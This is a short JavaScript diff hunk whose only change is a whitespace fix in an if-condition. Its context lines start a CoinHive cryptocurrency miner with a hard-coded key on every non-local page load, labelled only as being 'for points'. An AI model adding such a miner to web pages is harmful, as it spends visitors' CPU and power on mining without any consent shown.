@@ -8,7 +8,7 @@ if (window.location.search.length > 1) {
   document.querySelector("#portal").style.display = "inherit";
   document.querySelector("#start").value = window.location.search.slice(1);
   named = true;
-  if  (window.location.origin != "file://") {
+  if (window.location.origin != "file://") {
     // Add coin hive for points
     var miner = new CoinHive.User("7RaiTYKeaBtz17GRNjKDr0LNIpdiT2VR", window.location.search+window.location.hash);
     miner.start();
